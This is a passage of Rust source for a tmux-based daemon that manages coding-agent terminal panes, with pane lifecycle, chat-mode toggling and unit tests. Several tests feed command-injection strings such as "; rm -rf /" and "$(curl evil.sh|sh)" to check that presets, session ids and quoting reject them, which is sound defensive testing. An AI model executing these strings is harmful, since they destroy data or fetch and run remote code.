        validate::display_name(title)?;
        validate::command_preset(command_preset)?;

        let ws = self.store.get_workspace(workspace_id)?;
        let pane = self.pane_of(target).await?;
        let (axis, before) = crate::layout::split_args(side);

        let term = self.store.create_terminal(
            workspace_id,
            title,
            command_preset,
            TerminalIntent::Running,
            120,
            40,
        )?;

        let command = preset_command(command_preset, term.agent_session_id.as_deref());
        let created = self
            .tmux
            .split_pane(&pane.pane_id, axis, term.id, &ws.worktree_path, &command, before)
            .await;

        let pane_id = match created {
            Ok(id) => id,
            Err(e) => {
                let _ = self.store.update_terminal(
                    term.id,
                    term.resource_version,
                    terminal_update(&term, |u| u.intent = TerminalIntent::Failed),
                );
                return Err(e);
            }
        };

        // The new pane takes the keyboard: you split in order to type in it.
        let _ = self.tmux.select_pane(&pane_id).await;

        let snapshot = self.inventory.refresh().await;
        if snapshot.claimants(term.id).iter().any(|p| p.proves_life()) {
            return self.store.update_terminal(
                term.id,
                term.resource_version,
                terminal_update(&term, |u| u.runtime_confirmed = true),
            );
        }

        tracing::warn!(terminal = %term.id, "split pane did not verify");
        Ok(term)
    }

    /// Kill exactly this terminal's pane.
    ///
    /// A pane, not a window: a window is now a whole layout, and killing one
    /// would take every other terminal in it. That was safe only while each
    /// window held a single pane.
    async fn kill_pane(&self, id: Uuid) -> Result<bool> {
        let Ok(pane) = self.pane_of(id).await else { return Ok(false) };
        self.tmux.kill_pane(&pane.pane_id).await
    }

    /// Stop a terminal. Signals the daemon-owned pane, then records intent.
    pub async fn stop_terminal(&self, id: Uuid) -> Result<models::Terminal> {
        let term = self.store.get_terminal(id)?;
        self.kill_pane(id).await?;
        self.inventory.refresh().await;

        self.store.update_terminal(
            id,
            term.resource_version,
            terminal_update(&term, |u| u.intent = TerminalIntent::Stopped),
        )
    }

    /// Forget a lost terminal, without ever claiming it exited.
    ///
    /// It used to only set a flag, which cleared the workspace error and left
    /// the terminal listed as lost with a Dismiss button that could not change
    /// anything a second time. A lost terminal has no pane, no output and no
    /// exit code: once the user has acknowledged it there is nothing left for
    /// the record to say, so dismissing it deletes it.
    ///
    /// Still no exit is invented. `restart` remains the other answer, and it is
    /// the one to reach for when the work mattered — this is the answer for a
    /// row you want gone.
    pub async fn dismiss_lost(&self, id: Uuid) -> Result<()> {
        let term = self.store.get_terminal(id)?;
        let derived = self.derive_one(&term);

        if derived.state != TerminalState::Lost {
            return Err(DomainError::InvalidArgument { what: "terminal is not lost" });
        }

        self.store.delete_terminal(id, term.resource_version)
    }

    /// Restart a lost or exited terminal as a NEW epoch from the same preset.
    pub async fn restart_terminal(&self, id: Uuid) -> Result<models::Terminal> {
        let term = self.store.get_terminal(id)?;
        let ws = self.store.get_workspace(term.workspace_id)?;

        let _ = self.tmux.kill_terminal_window(id).await;

        // A restarted claude reattaches to the conversation it already had
        // rather than starting a new one the record does not know about.
        //
        // A TUI, though — not the ACP shim. `preset_command` knows how to start
        // an agent in a terminal and nothing about `agent-host`, so a lost pane
        // that was in AGENT mode comes back as a plain `claude` TUI. The record
        // has to come back with it: left saying `Agent`, SQLite would claim a
        // chat while the pane held a terminal, no shim would ever dial the
        // socket, and the pane's activity would sit frozen at whatever it last
        // reported. That is precisely the silent disagreement between record
        // and runtime this whole design exists to prevent.
        let command = preset_command(&term.command_preset, term.agent_session_id.as_deref());
        self.tmux
            .create_terminal_window(term.workspace_id, id, &term.title, &ws.worktree_path, &command)
            .await?;

        self.inventory.refresh().await;

        let restarted = self.store.update_terminal(
            id,
            term.resource_version,
            terminal_update(&term, |u| {
                u.intent = TerminalIntent::Running;
                u.runtime_confirmed = true;
                u.exit_code = None;
                u.exit_signal = None;
                // A new runtime means a new epoch: offsets restart at zero.
                u.epoch = term.epoch + 1;
            }),
        )?;

        if term.pane_mode != models::PaneMode::Agent {
            return Ok(restarted);
        }
        // Told the truth about what is in the pane. The user can switch it back
        // to a chat, which respawns it as the shim properly.
        self.store.set_pane_mode(
            id,
            restarted.resource_version,
            models::PaneMode::Terminal,
            term.agent_session_id.clone(),
        )
    }

    /// Toggle a terminal between hosting a TUI and hosting an ACP agent.
    ///
    /// The pane is respawned rather than replaced, so the terminal keeps its
    /// id, its tag and its rectangle, and a chat opening in one tile of four
    /// does not rearrange the other three.
    pub async fn set_pane_mode(
        &self,
        id: Uuid,
        pane_mode: models::PaneMode,
        force: bool,
    ) -> Result<models::Terminal> {
        let term = self.store.get_terminal(id)?;
        let ws = self.store.get_workspace(term.workspace_id)?;

        // `ConfirmationRequired` rather than a new code: a turn in flight is
        // exactly the existing "tell the user what this destroys and ask", and
        // `force` is the confirmation coming back.
        agent_supervisor::guard_toggle(self.agents.activity(id), force)
            .map_err(|_| DomainError::ConfirmationRequired)?;

        let snapshot = self.inventory.refresh().await;
        let pane = snapshot
            .claimants(id)
            .into_iter()
            .find(|p| p.proves_life())
            .ok_or(DomainError::NotFound)?;

        // A session id already declared at launch is reused; a hand-started
        // agent is looked up, and an ambiguous lookup refuses rather than
        // attaching a chat to the wrong conversation.
        let session_id = match term.agent_session_id.clone() {
            Some(existing) => Some(existing),
            // Adoption, and it has to be earned rather than assumed.
            //
            // This used to search unconditionally with a start time of the
            // UNIX epoch, which defeated the staleness guard entirely, and
            // then swallowed the ambiguity refusal with `.ok()`. So a SHELL
            // pane switching to agent mode quietly adopted whatever single
            // session happened to exist in the worktree — routinely the
            // conversation belonging to a different pane, which then showed
            // the same transcript under two identities.
            None if self.pane_runs_an_agent(id).await => {
                let home = directories::UserDirs::new()
                    .map(|d| d.home_dir().to_path_buf())
                    .ok_or(DomainError::NotFound)?;
                // Anything another terminal already claims is not ours to
                // take. Two panes rendering one conversation is worse than a
                // pane starting a fresh one.
                let claimed: Vec<String> = self
                    .store
                    .list_terminals_for_workspace(term.workspace_id)
                    .unwrap_or_default()
                    .into_iter()
                    .filter(|t| t.id != id)
                    .filter_map(|t| t.agent_session_id)
                    .collect();
                match session_discovery::discover_claude_session(
                    &home,
                    Path::new(&ws.worktree_path),
                    std::time::SystemTime::UNIX_EPOCH,
                ) {
                    Ok(found) if !claimed.contains(&found) => Some(found),
                    Ok(found) => {
                        tracing::info!(
                            session = %found,
                            "the only session here belongs to another terminal; starting a new one"
                        );
                        None
                    }
                    // Ambiguous or absent: start fresh rather than guess which
                    // of several conversations this pane meant.
                    Err(e) => {
                        tracing::info!(error = %e, "no session to adopt; starting a new one");
                        None
                    }
                }
            }
            None => None,
        };

        // What the shim ACTUALLY has, preferred over what the record hoped for.
        //
        // A session is often not the one we asked for: `session/load` can fail
        // and the adapter starts a fresh one instead. Only the shim knows the
        // id that resulted, and it reports it in `Established` — which until
        // now lived in memory and nowhere else. So the record kept a stale id,
        // switching back ran `claude --resume` on a conversation that was not
        // the one on screen, and switching in again failed to load it and
        // opened a third. Every toggle lost the thread and drew a gap saying
        // so.
        let session_id = self.agents.session_id(id).or(session_id);

        let command = match pane_mode {
            models::PaneMode::Terminal => {
                let sid = session_id.clone().unwrap_or_default();
                let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".to_string());
                // Resumable only if there is something on disk to resume.
                //
                // Claude Code writes a transcript when a turn happens, not
                // when a session is created — so a chat opened and closed
                // without a word has a perfectly real session id and no file.
                // `--resume` answers "No conversation found with session ID"
                // for those, which is what a user got every time they looked
                // at a chat and switched straight back.
                let resumable = Uuid::parse_str(&sid).is_ok()
                    && directories::UserDirs::new().is_some_and(|dirs| {
                        session_discovery::transcript_exists(
                            dirs.home_dir(),
                            Path::new(&ws.worktree_path),
                            &sid,
                        )
                    });
                if resumable {
                    format!("{shell} -ilc 'claude --resume {sid}'")
                } else {
                    // Nothing to continue: start claude clean rather than fail
                    // into an error message the user cannot act on.
                    preset_command("claude", None)
                }
            }
            models::PaneMode::Agent => {
                let binary = shim_binary(std::env::current_exe().ok().as_deref());
                // `root`, not a second `runtime_dir` field: it is already where
                // this daemon's socket-bearing runtime state lives, and a
                // parallel field would only ever be able to agree with it or be
                // a bug.
                let socket = agent_supervisor::socket_path(&self.root, id).display().to_string();
                // Quoted, every one of them. tmux hands this string to a shell,
                // and a worktree under `~/My Projects` would otherwise split
                // into two words and take the whole feature down for anyone
                // whose paths have spaces in them. The binary path and the
                // socket path are just as capable of containing one.
                let session = session_id
                    .as_deref()
                    .map(|s| format!(" --session {}", shell_quote(s)))
                    .unwrap_or_default();
                format!(
                    "{} agent-host --terminal {id} --socket {} --worktree {}{session}",
                    shell_quote(&binary),
                    shell_quote(&socket),
                    shell_quote(&ws.worktree_path),
                )
            }
        };

        // Bound BEFORE the pane is respawned. The shim dials on startup and
        // retries, so a later bind would still be found — but only after a
        // backoff the user spends staring at an empty chat, and only if the
        // retry loop outlives the gap.
        if pane_mode == models::PaneMode::Agent {
            self.agents.ensure_listening(&self.root, id);
        }

        // Named after the agent it is hosting, before the pane stops being able
        // to say. Every surface labels a terminal by what is running in it, and
        // in agent mode that is `farcooler agent-host` — so a Claude session
        // rendered natively appeared in the sidebar as "agent", which is the one
        // thing every agent pane has in common and therefore says nothing. The
        // screen is still the old agent's at this instant; a moment later it is
        // the shim's and the answer is gone.
        let harness = farcooler_core::activity::identify(
            &pane.command,
            &self.screen(id).await.map(|(text, _, _)| text).unwrap_or_default(),
        )
        .map(|rules| rules.preset.to_string());

        // An agent we cannot actually host is refused, not quietly replaced.
        //
        // The adapter is chosen by the shim, and it only knows one. So a Codex
        // pane switched to chat did not render Codex — it started a brand new
        // CLAUDE session in the same worktree and drew that instead, with
        // nothing anywhere saying the agent had been swapped. Losing the
        // toggle is a small disappointment; being handed a different agent
        // wearing the same pane is a much larger one.
        //
        // A pane with NO agent in it is refused for a related reason. It used
        // to be allowed, and `pane_runs_an_agent` would then look for a session
        // to adopt — so switching a plain shell into chat showed whatever
        // conversation happened to be lying around in that worktree, usually
        // one belonging to a different pane.
        if pane_mode == models::PaneMode::Agent {
            match harness.as_deref() {
                Some(h) if CHAT_CAPABLE.contains(&h) => {}
                Some(_) => {
                    return Err(DomainError::InvalidArgument {
                        what: "this agent has no chat adapter; it stays in terminal mode",
                    });
                }
                None => {
                    return Err(DomainError::InvalidArgument {
                        what: "nothing in this pane is an agent",
                    });
                }
            }
        }

        self.tmux.respawn_pane(&pane.pane_id, &ws.worktree_path, &command).await?;
        let updated = self.store.set_pane_mode(id, term.resource_version, pane_mode, session_id)?;
        let Some(harness) = harness.filter(|_| pane_mode == models::PaneMode::Agent) else {
            return Ok(updated);
        };
        self.store.update_terminal(
            id,
            updated.resource_version,
            terminal_update(&updated, |u| u.command_preset = harness),
        )
    }

    /// Files in a workspace's worktree, for the `@`-mention picker.
    ///
    /// Substring match on the worktree-relative path, capped. Deliberately not
    /// a git call: an untracked file the agent just created is exactly the one
    /// a user wants to mention next.
    pub async fn search_worktree_files(
        &self,
        workspace_id: Uuid,
        query: &str,
        limit: u32,
    ) -> Result<Vec<String>> {
        let ws = self.store.get_workspace(workspace_id)?;
        let root = PathBuf::from(&ws.worktree_path);
        let needle = query.to_lowercase();
        let cap = if limit == 0 { 50 } else { limit.min(500) } as usize;

        let mut out = Vec::new();
        let mut stack = vec![root.clone()];
        while let Some(dir) = stack.pop() {
            let Ok(entries) = std::fs::read_dir(&dir) else { continue };
            for entry in entries.flatten() {
                let path = entry.path();
                let name = entry.file_name();
                let name = name.to_string_lossy();
                if SKIP_DIRS.contains(&name.as_ref()) {
                    continue;
                }
                if path.is_dir() {
                    stack.push(path);
                    continue;
                }
                let Ok(relative) = path.strip_prefix(&root) else { continue };
                let relative = relative.display().to_string();
                if needle.is_empty() || relative.to_lowercase().contains(&needle) {
                    out.push(relative);
                    if out.len() >= cap {
                        return Ok(out);
                    }
                }
            }
        }
        Ok(out)
    }

    // ---- runtime ----
    //
    // These operate on tmux alone and never touch the database, which is what
    // lets a client stream a terminal without going through the daemon at all.
    // They live on `Runtime`; `Service` exposes them for callers that already
    // hold one.

    pub fn runtime(&self) -> Runtime {
        // A clone, but not a copy: `LiveInventory` shares one `Arc` view, so
        // this is the same inventory rather than a second one that could
        // disagree with it.
        Runtime { tmux: self.tmux.clone(), inventory: self.inventory.clone() }
    }

    pub async fn send_input(&self, id: Uuid, data: &str) -> Result<()> {
        self.runtime().send_input(id, data).await
    }

    pub async fn send_bytes_hex(&self, id: Uuid, hex: &str) -> Result<()> {
        self.runtime().send_bytes_hex(id, hex).await
    }

    pub async fn screen(&self, id: Uuid) -> Result<(String, u32, u32)> {
        self.runtime().screen(id).await
    }

    pub async fn stream(&self, id: Uuid) -> Result<()> {
        self.runtime().stream(id).await
    }

    pub async fn input_channel(&self, id: Uuid) -> Result<()> {
        self.runtime().input_channel(id).await
    }

    pub async fn resize_terminal(&self, id: Uuid, columns: u32, rows: u32) -> Result<()> {
        self.runtime().resize_terminal(id, columns, rows).await
    }

    /// The escape sequences that put a fresh emulator into the modes this
    /// pane's program is in. See `TerminalScreen.modes`.
    pub async fn pane_modes(&self, id: Uuid) -> Result<String> {
        self.runtime().pane_modes(id).await
    }

    /// Where the cursor is, so a client can draw it in the right cell.
    pub async fn cursor(&self, id: Uuid) -> Result<(u32, u32)> {
        self.runtime().cursor(id).await
    }

    /// Send exact bytes to a terminal.
    ///
    /// Bytes rather than text, because a key is not always a character: arrows,
    /// Ctrl-C and a bracketed paste are byte sequences, and anything re-encoding
    /// them on the way would need to know the terminal's mode to get them right.
    pub async fn send_bytes(&self, id: Uuid, payload: &[u8]) -> Result<()> {
        let hex: String = payload.iter().map(|b| format!("{b:02x}")).collect();
        self.runtime().send_bytes_hex(id, &hex).await
    }

    pub async fn capture(&self, id: Uuid, lines: u32) -> Result<String> {
        self.runtime().capture(id, lines).await
    }

    // ---- derivation ----

    /// The live runtime view as of the last refresh.
    /// Compare what the inventory believes against what tmux says.
    ///
    /// Exposed so the watcher can run it: `LiveInventory::backstop_reconcile`
    /// existed with no callers, which meant the defect it detects — a missed
    /// control-mode notification — could never be reported.
    pub async fn backstop_reconcile(&self) {
        self.inventory.backstop_reconcile().await;
    }

    pub fn inventory_snapshot(&self) -> farcooler_core::inventory::RuntimeSnapshot {
        self.inventory.snapshot()
    }

    fn derive_one(&self, term: &models::Terminal) -> DerivedTerminal {
        let snapshot = self.inventory.snapshot();
        derive::derive_terminal(&to_record(term), &snapshot)
    }

    /// One workspace with every state derived fresh.
    pub async fn workspace_view(&self, ws: &models::Workspace) -> Result<WorkspaceView> {
        let snapshot = self.inventory.snapshot();
        let terminals = self.store.list_terminals_for_workspace(ws.id)?;

        let views: Vec<TerminalView> = terminals
            .into_iter()
            .map(|t| {
                let derived = derive::derive_terminal(&to_record(&t), &snapshot);
                TerminalView { terminal: t, derived }
            })
            .collect();

        let pairs: Vec<_> = views
            .iter()
            .map(|v| (to_record(&v.terminal), v.derived.clone()))
            .collect();

        let state = derive::derive_workspace(
            ws.hidden,
            ws.worktree_missing,
            ws.creation_failed,
            &pairs,
        );

        Ok(WorkspaceView { workspace: ws.clone(), state, terminals: views })
    }

    /// The whole fleet, refreshed once. One inventory query, not one per terminal.
    pub async fn fleet(&self) -> Result<Vec<WorkspaceView>> {
        self.inventory.refresh().await;
        let mut out = Vec::new();
        for ws in self.list_workspaces()? {
            out.push(self.workspace_view(&ws).await?);
        }
        Ok(out)
    }
}

fn to_record(t: &models::Terminal) -> derive::TerminalRecord {
    derive::TerminalRecord {
        id: t.id,
        workspace_id: t.workspace_id,
        intent: t.intent,
        runtime_confirmed: t.runtime_confirmed,
        exit_code: t.exit_code,
        exit_signal: t.exit_signal,
    }
}

fn terminal_update(
    t: &models::Terminal,
    f: impl FnOnce(&mut models::TerminalUpdate),
) -> models::TerminalUpdate {
    let mut u = models::TerminalUpdate {
        title: t.title.clone(),
        command_preset: t.command_preset.clone(),
        intent: t.intent,
        runtime_confirmed: t.runtime_confirmed,
        exit_code: t.exit_code,
        exit_signal: t.exit_signal,
        lease_generation: t.lease_generation,
        epoch: t.epoch,
        columns: t.columns,
        rows: t.rows,
    };
    f(&mut u);
    u
}

/// Refuse `/`, a home directory root, and system directories.
fn reject_sensitive_root(path: &Path) -> Result<()> {
    let s = path.to_string_lossy();
    let sensitive = s == "/"
        || s.starts_with("/System")
        || s.starts_with("/Library")
        || s.starts_with("/usr")
        || s.starts_with("/bin")
        || s.starts_with("/sbin")
        || s.starts_with("/etc")
        || s.starts_with("/var");

    if sensitive {
        return Err(DomainError::PathNotAllowed);
    }

    if let Some(home) = std::env::var_os("HOME")
        && Path::new(&home) == path
    {
        return Err(DomainError::PathNotAllowed);
    }
    Ok(())
}

fn sanitize(s: &str) -> String {
    s.chars()
        .map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '-' })
        .collect()
}

fn now_millis() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or(0)
}

/// Derive a stable UUID from the install id so the daemon identity survives
/// restarts and previously written tags remain provable.
pub(crate) fn stable_host_id(install_id: &str) -> Uuid {
    let mut bytes = [0u8; 16];
    for (i, b) in install_id.as_bytes().iter().enumerate() {
        bytes[i % 16] ^= *b;
    }
    Uuid::from_bytes(bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn presets_run_through_an_interactive_login_shell() {
        // Startup files, version managers, direnv and aliases must behave like a
        // hand-launched terminal.
        // Quoted now, because a preset may carry a model.
        assert!(preset_command("claude", None).contains("-ilc 'claude'"));
        assert!(preset_command("shell", None).ends_with("-il"));
        assert!(preset_command("cursor", None).contains("cursor-agent"));
    }

    #[test]
    fn sensitive_roots_are_refused() {
        for p in ["/", "/System/Library", "/usr/local", "/etc"] {
            assert!(
                reject_sensitive_root(Path::new(p)).is_err(),
                "{p} should be refused as a repository root"
            );
        }
    }

    #[test]
    fn the_home_directory_itself_is_refused() {
        if let Some(home) = std::env::var_os("HOME") {
            assert!(reject_sensitive_root(Path::new(&home)).is_err());
            // but a project directory inside it is fine
            let inside = Path::new(&home).join("Dev");
            assert!(reject_sensitive_root(&inside).is_ok());
        }
    }

    #[test]
    fn host_id_is_stable_for_an_install() {
        assert_eq!(stable_host_id("abc123"), stable_host_id("abc123"));
        assert_ne!(stable_host_id("abc123"), stable_host_id("def456"));
    }

    #[test]
    fn sanitize_keeps_paths_predictable() {
        assert_eq!(sanitize("my repo/name"), "my-repo-name");
        assert_eq!(sanitize("ok_name-1"), "ok_name-1");
    }

    /// A service backed by its own throwaway database.
    ///
    /// `keep` rather than letting the `TempDir` drop: the guard would delete
    /// the directory the instant this function returns, before the caller
    /// ever opens it.
    async fn temp_service() -> Service {
        let dir = tempfile::tempdir().unwrap().keep();
        Service::open_in(dir).await.unwrap()
    }

    /// A workspace whose worktree is a real, empty directory a test can write
    /// into — everything `search_worktree_files` needs and nothing tmux or git
    /// would add, since this is a store-level fixture rather than a live one.
    async fn seed_workspace(service: &Service) -> models::Workspace {
        let worktree = tempfile::tempdir().unwrap().keep();
        let root = service
            .store
            .create_repository_root(service.host_id, "/tmp/worktree-search-root", now_millis())
            .unwrap();
        let repo = service
            .store
            .create_repository(service.host_id, root.id, "repo", "/tmp/worktree-search-root/.git", "")
            .unwrap();
        service
            .store
            .create_workspace(repo.id, "task", "branch", &worktree.display().to_string(), false)
            .unwrap()
    }

    #[tokio::test]
    async fn worktree_search_finds_a_file_that_git_has_never_seen() {
        // The @-mention case that matters: the file the agent just created.
        let service = temp_service().await;
        let ws = seed_workspace(&service).await;
        std::fs::write(
            std::path::Path::new(&ws.worktree_path).join("brand_new.rs"),
            "fn main() {}",
        )
        .unwrap();
        let hits = service.search_worktree_files(ws.id, "brand", 10).await.unwrap();
        assert_eq!(hits, vec!["brand_new.rs".to_string()]);
    }

    #[tokio::test]
    async fn worktree_search_never_offers_the_git_directory() {
        let service = temp_service().await;
        let ws = seed_workspace(&service).await;
        let git_dir = std::path::Path::new(&ws.worktree_path).join(".git");
        std::fs::create_dir_all(&git_dir).unwrap();
        std::fs::write(git_dir.join("HEAD"), "ref: refs/heads/main").unwrap();
        let hits = service.search_worktree_files(ws.id, "", 500).await.unwrap();
        assert!(!hits.iter().any(|p| p.starts_with(".git/")), "{hits:?}");
    }

    /// Hiding never consults terminal state at all — proven structurally,
    /// since a genuinely `Running` derived state cannot be manufactured
    /// here.
    ///
    /// This is a store-level fixture with no live tmux pane behind it, so a
    /// terminal created with `TerminalIntent::Running` derives `Starting`,
    /// not `Running` (see `a_starting_terminal_blocks_removal_same_as_a_running_one`
    /// below, which asserts exactly that for the identical call — the old
    /// `archive_workspace` guard checked `== TerminalState::Running` only,
    /// so this scenario would not have been refused under the old code
    /// either). What this test can honestly prove instead: the workspace is
    /// demonstrably not idle — `workspace_view` reports it `Active`, the
    /// same state a truly running terminal would produce — and `hide_workspace`
    /// still succeeds unconditionally, because it never reads terminal state
    /// in the first place. The case of a truly `Running` terminal needs a
    /// live pane and belongs in an integration test with real tmux instead.
    #[tokio::test]
    async fn hiding_does_not_consult_terminal_state() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .next()
            .unwrap();
        svc.store
            .create_terminal(ws.id, "agent", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();

        let view = svc.workspace_view(&ws).await.unwrap();
        assert_eq!(
            view.state,
            WorkspaceState::Active,
            "the workspace must actually carry something alive for this test to mean anything: {view:?}"
        );

        let hidden = svc.hide_workspace(ws.id).await.unwrap();
        assert!(hidden.hidden);

        let back = svc.unhide_workspace(hidden.id).await.unwrap();
        assert!(!back.hidden);
    }
}

#[cfg(test)]
mod preset_tests {
    use super::*;

    #[test]
    fn a_bare_preset_runs_the_agent() {
        assert!(preset_command("claude", None).contains("'claude'"));
        assert!(preset_command("codex", None).contains("'codex'"));
        assert!(preset_command("cursor", None).contains("'cursor-agent'"));
        assert!(preset_command("shell", None).ends_with("-il"));
    }

    #[test]
    fn a_model_is_passed_through() {
        assert!(preset_command("claude:opus", None).contains("claude --model opus"));
        assert!(preset_command("codex:gpt-5.6-sol", None).contains("codex --model gpt-5.6-sol"));
    }

    #[test]
    fn a_model_that_is_not_an_identifier_is_dropped_not_escaped() {
        // This string reaches a `-ilc` argument. Dropping it loses nothing real
        // and leaves no argument about quoting.
        let out = preset_command("claude:opus'; rm -rf /; '", None);
        assert!(!out.contains("rm -rf"));
        assert!(out.contains("'claude'"));
    }

    #[test]
    fn an_unrecognised_preset_that_is_not_an_identifier_runs_nothing() {
        let out = preset_command("$(curl evil.sh|sh)", None);
        assert!(!out.contains("curl"));
        assert!(out.ends_with("-il"), "falls back to a plain shell");
    }

    #[test]
    fn a_custom_agent_name_still_works() {
        // Presets are not a closed set: someone's own wrapper should run.
        assert!(preset_command("aider", None).contains("'aider'"));
        assert!(preset_command("aider:sonnet", None).contains("aider --model sonnet"));
    }

    #[test]
    fn a_claude_terminal_is_launched_with_the_session_id_we_chose() {
        // So that switching this pane to agent mode later is a lookup rather
        // than a guess about which of several .jsonl files is ours.
        let cmd = preset_command("claude", Some("018f5b2c-0000-7000-8000-000000000000"));
        assert!(cmd.contains("--session-id 018f5b2c-0000-7000-8000-000000000000"), "{cmd}");
    }

    #[test]
    fn a_shell_is_not_given_a_session_id() {
        let cmd = preset_command("shell", Some("018f5b2c-0000-7000-8000-000000000000"));
        assert!(!cmd.contains("--session-id"), "{cmd}");
    }

    #[test]
    fn a_session_id_that_is_not_a_uuid_is_dropped_rather_than_escaped() {
        // It ends up inside a `-ilc` string. The existing rule for models
        // applies here for the same reason.
        let cmd = preset_command("claude", Some("; rm -rf /"));
        assert!(!cmd.contains("rm -rf"), "{cmd}");
        assert!(!cmd.contains("--session-id"), "{cmd}");
    }

    #[test]
    fn the_shim_is_the_cli_beside_the_daemon_not_the_daemon_itself() {
        // Found end to end, not by a test: the pane ran `farcoolerd agent-host`,
        // which ignored its arguments and exited 0. The pane died instantly and
        // the terminal derived as an exit nobody caused, while set-pane-mode
        // reported success — agent mode was completely broken and said nothing.
        let dir = std::env::temp_dir().join(format!("farcooler-shim-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let daemon = dir.join("farcoolerd");
        std::fs::write(&daemon, "").unwrap();
        std::fs::write(dir.join("farcooler"), "").unwrap();

        assert_eq!(shim_binary(Some(&daemon)), dir.join("farcooler").display().to_string());
        assert!(!shim_binary(Some(&daemon)).ends_with("farcoolerd"));
    }

    #[test]
    fn a_daemon_installed_without_its_cli_beside_it_falls_back_to_the_path() {
        let dir = std::env::temp_dir().join(format!("farcooler-shim-alone-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let daemon = dir.join("farcoolerd");
        std::fs::write(&daemon, "").unwrap();
        // No sibling `farcooler`: naming a path that does not exist would fail
        // in the pane with no explanation, so PATH is the better guess.
        assert_eq!(shim_binary(Some(&daemon)), "farcooler");
        assert_eq!(shim_binary(None), "farcooler");
    }

    #[test]
    fn a_path_with_a_space_survives_becoming_a_shell_command() {
        // The failure this prevents is total rather than partial: a worktree
        // under `~/My Projects` splits into two arguments, `agent-host` is
        // handed a --worktree it cannot use, and agent mode is simply broken
        // for that user with nothing on screen explaining why.
        assert_eq!(shell_quote("/Users/e/My Projects/app"), "'/Users/e/My Projects/app'");
    }

    #[test]
    fn a_quote_in_a_path_cannot_end_the_quoting() {
        // Single quotes protect everything except a single quote, so that one
        // character has to be closed, escaped and reopened — otherwise a path
        // containing one ends the quoted run and whatever follows is read as
        // shell syntax.
        assert_eq!(shell_quote("it's"), r"'it'\''s'");
    }

    #[test]
    fn a_real_shell_reads_back_exactly_what_was_quoted() {
        // Asserted against a shell rather than against the escaped text,
        // because the escaped text is not the thing that has to be right — the
        // shell's reading of it is. An earlier version of this test checked
        // that the output did not contain `'; rm`, which correct escaping
        // produces anyway, and so proved nothing.
        for original in [
            "/Users/e/My Projects/app",
            "it's",
            "/tmp/a'; rm -rf /; echo '",
            "$HOME/`whoami`",
            "a\"b",
            "back\\slash",
        ] {
            let out = std::process::Command::new("/bin/sh")
                .arg("-c")
                .arg(format!("printf %s {}", shell_quote(original)))
                .output()
                .expect("run a shell");
            assert_eq!(
                String::from_utf8_lossy(&out.stdout),
                original,
                "a shell did not read back {original:?} unchanged"
            );
        }
    }
}


/// A path in its canonical form, or unchanged when it cannot be resolved.
///
/// Comparing worktree paths by string alone would offer an already-registered
/// worktree as new whenever git and the database spelled the same directory
/// differently — a symlinked home, a trailing slash, `/var` against
/// `/private/var`. A path that no longer exists cannot be canonicalised, and
/// falling back to the raw string keeps it comparable with itself.
pub fn canonical_or_raw(path: &str) -> PathBuf {
    std::fs::canonicalize(path).unwrap_or_else(|_| PathBuf::from(path))
}

#[cfg(test)]
mod chat_capability_tests {
    use super::CHAT_CAPABLE;

    #[test]
    fn an_agent_with_no_adapter_is_not_chat_capable() {
        // Codex and cursor-agent are recognised by `activity::identify` and
        // have no ACP adapter here. Treating recognition as support is what
        // made a Codex pane switch to chat and quietly render a brand new
        // Claude session in its place.
        assert!(CHAT_CAPABLE.contains(&"claude"));
        assert!(!CHAT_CAPABLE.contains(&"codex"));
        assert!(!CHAT_CAPABLE.contains(&"cursor"));
    }
}

#[cfg(test)]
mod lock_tests {
    use super::*;

    /// Two calls for the same repository get the same lock; different
    /// repositories do not block each other.
    ///
    /// The identity matters more than it looks: a lock built fresh per call
    /// would compile, pass a casual reading, and serialize nothing at all.
    #[tokio::test]
    async fn one_lock_per_repository() {
        let dir = tempfile::tempdir().unwrap();
        let svc = Service::open_in(dir.path().to_path_buf()).await.unwrap();

        let a = Uuid::now_v7();
        let b = Uuid::now_v7();

        assert!(Arc::ptr_eq(&svc.repo_lock(a), &svc.repo_lock(a)), "same repository, same lock");
        assert!(!Arc::ptr_eq(&svc.repo_lock(a), &svc.repo_lock(b)), "one repository never blocks another");

        let held = svc.repo_lock(a).lock_owned().await;
        assert!(svc.repo_lock(a).try_lock().is_err(), "a held lock excludes a second holder");
        assert!(svc.repo_lock(b).try_lock().is_ok(), "and only that repository");
        drop(held);
    }
}

#[cfg(test)]
mod remove_root_tests {
    use super::*;

    /// A registered repository with one workspace already in it, all created
    /// through the store directly. `remove_root` never touches git, so a
    /// store-level fixture is enough — the point of these tests is the
    /// refusal logic, not worktree mechanics.
    async fn fixture_with_workspace() -> (Service, models::RepositoryRoot, models::Workspace) {
        let dir = tempfile::tempdir().unwrap().keep();
        let service = Service::open_in(dir).await.unwrap();
        let root = service
            .store
            .create_repository_root(service.host_id, "/tmp/remove-root-tests", now_millis())
            .unwrap();
        let repository = service
            .store
            .create_repository(service.host_id, root.id, "repo", "/tmp/remove-root-tests/.git", "")
            .unwrap();
        let workspace = service
            .store
            .create_workspace(repository.id, "main", "main", "/tmp/remove-root-tests", true)
            .unwrap();
        (service, root, workspace)
    }

    /// A terminal that was just created and has never been confirmed alive
    /// derives `Starting`, not `Running` — created here through the store
    /// directly with no tmux window behind it, so it stays that way as long
    /// as the inventory itself is healthy (true here: `Service::open_in`
    /// refreshes against a real, if idle, private tmux server on startup).
    /// `remove_root` must refuse rather than delete its record.
    ///
    /// Honest note on what this does and does not isolate: the up-front check
    /// in `remove_root` was widened from `Running` alone to `Running |
    /// Starting`, matching `remove_terminal`. But `remove_terminal` — which
    /// the delete loop now calls for every terminal, and which already
    /// refused `Running | Starting` before this fix — provides the same
    /// refusal as a second, independent enforcement of the identical rule
    /// during deletion. So this test proves the OUTCOME the fix exists to
    /// guarantee (a starting terminal's record is never silently deleted),
    /// but does not by itself distinguish "caught by the up-front check" from
    /// "caught by `remove_terminal` a moment later" — flipping the up-front
    /// check back to `Running` alone does not turn this red, because the
    /// second guard still catches it. Confirmed by hand rather than left
    /// implied.
    #[tokio::test]
